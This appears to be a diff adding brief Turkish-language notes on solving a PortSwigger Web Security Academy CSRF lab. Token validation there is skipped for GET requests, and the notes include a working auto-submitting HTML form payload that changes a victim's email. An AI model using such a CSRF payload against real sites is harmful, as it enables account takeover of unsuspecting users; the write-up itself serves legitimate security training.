@@ -1,0 +1,20 @@
+Lab: CSRF where token validation depends on request method
+url: https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-request-method
+
+
+
+analiz: 
+-- mail değişimi esnasında istekleri takip ettik ve bu sefer csrf adlı bir cookie eklenmiş bu yüzden sade bir post iş göremez
+--bizde get metodunun korunup korunmadığına baktık . Bize 302 hatası dönsede canlı akışta mail adresinin değiştiğini anladık 
+
+payload:
+
+        <form method="GET" action="https://0ade00dd0421b90e8120e91000930072.web-security-academy.net/my-account/change-email">
+            <input type="hidden" name="email" value="hacked_by@harbinger">
+            <input type="submit" value="Submit request">
+        </form>
+        <script>
+                document.forms[0].submit();
+        </script>
+
+burada post methodunu get olarak değiştirdik ve  get methodunda csrf tokeni gerekmiyordu bu sayede payload başarılı oldu. mail değişti.
